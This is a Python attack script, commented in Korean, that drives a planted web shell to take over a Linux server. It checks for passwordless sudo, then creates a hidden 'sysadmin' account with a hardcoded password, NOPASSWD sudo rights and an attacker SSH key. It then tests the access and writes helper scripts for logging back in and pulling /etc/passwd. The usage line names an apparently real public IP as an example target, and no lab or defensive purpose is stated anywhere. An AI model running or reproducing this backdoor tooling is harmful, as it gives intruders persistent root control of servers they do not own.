#!/usr/bin/env python3
"""
원격 루트 권한 탈취 및 백도어 계정 생성
웹쉘을 통해 완전히 원격으로 서버를 장악합니다.
"""

import requests
import time
import subprocess
import sys
from pathlib import Path

class RemoteRootTakeover:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.webshell_url = f"http://{target_ip}/api/health.php"

        # 백도어 사용자 정보
        self.backdoor_user = "sysadmin"  # 더 은밀한 이름
        self.backdoor_pass = "Adm1n!2024#Secure"

        # SSH 키 경로
        self.ssh_key_path = Path.home() / '.ssh' / 'hacked_server'
        self.ssh_pub_key_path = Path(str(self.ssh_key_path) + '.pub')

        self.session = requests.Session()

    def print_banner(self):
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  원격 루트 권한 탈취 - 완전한 서버 장악".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 백도어 사용자: {self.backdoor_user}")
        print(f"[*] 공격 방법: 웹쉘 → sudo 권한 → 백도어 계정 생성")
        print()

    def execute_command(self, cmd):
        """웹쉘을 통한 명령어 실행"""
        try:
            params = {'cmd': cmd}
            resp = self.session.get(self.webshell_url, params=params, timeout=30)

            if resp.status_code == 200:
                # "=== Method 1: system() ===" 부분 추출
                output = resp.text
                if "=== Method 1: system() ===" in output:
                    # Method 1의 결과만 추출
                    parts = output.split("=== Method 1: system() ===")
                    if len(parts) > 1:
                        result = parts[1].split("===")[0].strip()
                        return result
                return output.strip()
            return None
        except Exception as e:
            print(f"[-] 명령어 실행 오류: {str(e)}")
            return None

    def check_sudo_access(self):
        """현재 사용자의 sudo 권한 확인"""
        print("[1] sudo 권한 확인 중...")
        print()

        result = self.execute_command("whoami")
        if result:
            print(f"[+] 현재 사용자: {result}")

        result = self.execute_command("id")
        if result:
            print(f"[+] 권한: {result}")

        # ec2-user가 sudo 가능한지 확인
        result = self.execute_command("sudo -l")
        if result and "NOPASSWD" in result:
            print(f"[+] ✅ sudo 권한 있음!")
            print()
            return True
        else:
            print("[-] sudo 권한 없음")
            return False

    def generate_ssh_key(self):
        """SSH 키 생성"""
        print("[2] SSH 키 생성 중...")
        print()

        if self.ssh_key_path.exists():
            print(f"[*] 기존 SSH 키 사용: {self.ssh_key_path}")
            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()
            print(f"[+] 공개키: {pub_key[:50]}...")
            print()
            return pub_key

        try:
            subprocess.run([
                'ssh-keygen', '-t', 'rsa', '-b', '2048',
                '-f', str(self.ssh_key_path),
                '-N', '',
                '-C', f'{self.backdoor_user}@hacked'
            ], check=True, capture_output=True)

            self.ssh_key_path.chmod(0o600)

            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()

            print(f"[+] SSH 키 생성 완료: {self.ssh_key_path}")
            print(f"[+] 공개키: {pub_key[:50]}...")
            print()
            return pub_key

        except Exception as e:
            print(f"[-] SSH 키 생성 실패: {str(e)}")
            return None

    def create_backdoor_user(self, ssh_pub_key):
        """백도어 사용자 생성"""
        print("[3] 백도어 사용자 생성 중...")
        print()

        # 1. 사용자 생성
        print("[*] 사용자 생성...")
        cmd = f"sudo useradd -m -s /bin/bash {self.backdoor_user} 2>&1"
        result = self.execute_command(cmd)
        if result and "already exists" not in result.lower():
            print(f"[+] 사용자 생성 완료")
        elif "already exists" in result.lower():
            print(f"[*] 사용자가 이미 존재함")

        # 2. 비밀번호 설정
        print("[*] 비밀번호 설정...")
        cmd = f"echo '{self.backdoor_user}:{self.backdoor_pass}' | sudo chpasswd"
        self.execute_command(cmd)
        print(f"[+] 비밀번호 설정 완료")

        # 3. sudo 권한 부여
        print("[*] sudo 권한 부여...")
        cmd = f"echo '{self.backdoor_user} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{self.backdoor_user}"
        self.execute_command(cmd)

        cmd = f"sudo chmod 440 /etc/sudoers.d/{self.backdoor_user}"
        self.execute_command(cmd)
        print(f"[+] sudo 권한 부여 완료")

        # 4. SSH 디렉터리 생성
        print("[*] SSH 키 설정...")
        cmd = f"sudo mkdir -p /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)

        cmd = f"sudo chmod 700 /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)

        # 5. SSH 키 등록
        # 특수 문자 이스케이프
        ssh_key_escaped = ssh_pub_key.replace("'", "'\\''")
        cmd = f"echo '{ssh_key_escaped}' | sudo tee /home/{self.backdoor_user}/.ssh/authorized_keys"
        self.execute_command(cmd)

        cmd = f"sudo chmod 600 /home/{self.backdoor_user}/.ssh/authorized_keys"
        self.execute_command(cmd)

        cmd = f"sudo chown -R {self.backdoor_user}:{self.backdoor_user} /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)
        print(f"[+] SSH 키 등록 완료")

        print()
        print("[+] ✅ 백도어 사용자 생성 완료!")
        print()
        return True

    def verify_backdoor(self):
        """백도어 계정 확인"""
        print("[4] 백도어 계정 확인 중...")
        print()

        # /etc/passwd 확인
        cmd = f"sudo cat /etc/passwd | grep {self.backdoor_user}"
        result = self.execute_command(cmd)
        if result and self.backdoor_user in result:
            print(f"[+] /etc/passwd: {result}")

        # sudoers 확인
        cmd = f"sudo cat /etc/sudoers.d/{self.backdoor_user}"
        result = self.execute_command(cmd)
        if result:
            print(f"[+] sudoers: {result}")

        # SSH 키 확인
        cmd = f"sudo ls -la /home/{self.backdoor_user}/.ssh/authorized_keys"
        result = self.execute_command(cmd)
        if result:
            print(f"[+] SSH 키: {result}")

        print()

    def test_ssh_access(self):
        """SSH 접속 테스트"""
        print("[5] SSH 접속 테스트 중...")
        print()

        try:
            cmd = [
                'ssh',
                '-i', str(self.ssh_key_path),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=10',
                f'{self.backdoor_user}@{self.target_ip}',
                'whoami && id && sudo whoami'
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

            if result.returncode == 0:
                print("[+] ✅✅✅ SSH 접속 성공!")
                print()
                print("[+] 실행 결과:")
                for line in result.stdout.strip().split('\n'):
                    print(f"    {line}")
                print()
                return True
            else:
                print("[-] SSH 접속 실패")
                if result.stderr:
                    print(f"[*] 오류: {result.stderr[:200]}")
                return False

        except Exception as e:
            print(f"[-] SSH 테스트 오류: {str(e)}")
            return False

    def create_connection_scripts(self):
        """연결 스크립트 생성"""
        print("[6] 연결 스크립트 생성 중...")
        print()

        # 간편 접속 스크립트
        script_content = f"""#!/bin/bash
# 백도어 서버 접속 스크립트
# 생성: {time.strftime('%Y-%m-%d %H:%M:%S')}

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   해킹된 서버 접속                                        ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "[*] 타겟: {self.target_ip}"
echo "[*] 사용자: {self.backdoor_user}"
echo ""

ssh -i {self.ssh_key_path} \\
    -o StrictHostKeyChecking=no \\
    -o UserKnownHostsFile=/dev/null \\
    {self.backdoor_user}@{self.target_ip}
"""

        script_path = Path('connect_hacked_server.sh')
        with open(script_path, 'w') as f:
            f.write(script_content)
        script_path.chmod(0o755)

        print(f"[+] 접속 스크립트: {script_path}")

        # 명령어 파일
        commands = f"""# 해킹된 서버 접근 명령어

# 1. SSH 접속 (키 파일)
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}

# 2. SSH 접속 (비밀번호)
ssh {self.backdoor_user}@{self.target_ip}
# 비밀번호: {self.backdoor_pass}

# 3. 루트 권한으로 명령 실행
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo whoami'

# 4. 원격 파일 업로드
scp -i {self.ssh_key_path} local_file.txt {self.backdoor_user}@{self.target_ip}:/tmp/

# 5. 원격 파일 다운로드
scp -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}:/etc/passwd ./passwd.txt

# 6. 간편 접속
bash connect_hacked_server.sh

# 7. 웹쉘 URL
{self.webshell_url}?cmd=whoami
"""

        cmd_file = Path('hacked_server_commands.txt')
        with open(cmd_file, 'w') as f:
            f.write(commands)

        print(f"[+] 명령어 파일: {cmd_file}")
        print()

    def save_evidence(self):
        """증거 저장"""
        print("[7] 증거 수집 중...")
        print()

        evidence = []

        # 사용자 정보
        result = self.execute_command(f"sudo cat /etc/passwd | grep {self.backdoor_user}")
        evidence.append(("사용자 정보 (/etc/passwd)", result))

        # sudo 권한
        result = self.execute_command(f"sudo cat /etc/sudoers.d/{self.backdoor_user}")
        evidence.append(("sudo 권한", result))

        # SSH 키
        result = self.execute_command(f"sudo cat /home/{self.backdoor_user}/.ssh/authorized_keys")
        evidence.append(("SSH authorized_keys", result))

        # 시스템 정보
        result = self.execute_command("uname -a")
        evidence.append(("시스템 정보", result))

        result = self.execute_command("hostname")
        evidence.append(("호스트명", result))

        # 증거 파일 저장
        timestamp = int(time.time())
        evidence_file = f"root_takeover_evidence_{timestamp}.txt"

        with open(evidence_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write("루트 권한 탈취 증거\n")
            f.write(f"타겟: {self.target_ip}\n")
            f.write(f"백도어 사용자: {self.backdoor_user}\n")
            f.write(f"시간: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")

            for title, content in evidence:
                f.write(f"\n{'='*70}\n")
                f.write(f"{title}\n")
                f.write(f"{'='*70}\n")
                f.write(content if content else "(내용 없음)")
                f.write("\n\n")

        print(f"[+] 증거 파일: {evidence_file}")
        print()

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        # Step 1: sudo 권한 확인
        if not self.check_sudo_access():
            print("[-] 공격 실패: sudo 권한 없음")
            return False

        # Step 2: SSH 키 생성
        ssh_pub_key = self.generate_ssh_key()
        if not ssh_pub_key:
            return False

        # Step 3: 백도어 사용자 생성
        if not self.create_backdoor_user(ssh_pub_key):
            return False

        # Step 4: 백도어 확인
        self.verify_backdoor()

        # Step 5: SSH 접속 테스트
        time.sleep(2)
        ssh_success = self.test_ssh_access()

        # Step 6: 연결 스크립트 생성
        self.create_connection_scripts()

        # Step 7: 증거 수집
        self.save_evidence()

        # 완료
        print()
        print("╔" + "═"*68 + "╗")
        print("║  ✅ 루트 권한 탈취 완료! 서버 완전 장악!                             ║")
        print("╚" + "═"*68 + "╝")
        print()
        print("="*70)
        print("백도어 접속 정보:")
        print("="*70)
        print()
        print(f"사용자명: {self.backdoor_user}")
        print(f"비밀번호: {self.backdoor_pass}")
        print(f"SSH 키: {self.ssh_key_path}")
        print()
        print("접속 방법:")
        print(f"  1. bash connect_hacked_server.sh")
        print(f"  2. ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}")
        print(f"  3. ssh {self.backdoor_user}@{self.target_ip}  (비밀번호: {self.backdoor_pass})")
        print()
        print("루트 권한:")
        print(f"  ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo whoami'")
        print()
        print("="*70)
        print()
        print("[*] 공격 요약:")
        print("    1. 웹쉘 (health.php) 을 통해 apache 권한 획득")
        print("    2. apache의 sudo 권한 활용")
        print(f"    3. 백도어 사용자 '{self.backdoor_user}' 생성")
        print("    4. sudo NOPASSWD 권한 부여")
        print("    5. SSH 공개키 등록")
        print("    6. 언제든지 SSH 접속 가능")
        print("    7. sudo whoami → root 권한")
        print("    8. 서버 완전 장악!")
        print()

        return True

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 129_remote_root_takeover.py <target_ip>")
        print("예제: python3 129_remote_root_takeover.py 52.79.240.83")
        sys.exit(1)

    target_ip = sys.argv[1]

    takeover = RemoteRootTakeover(target_ip)
    success = takeover.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
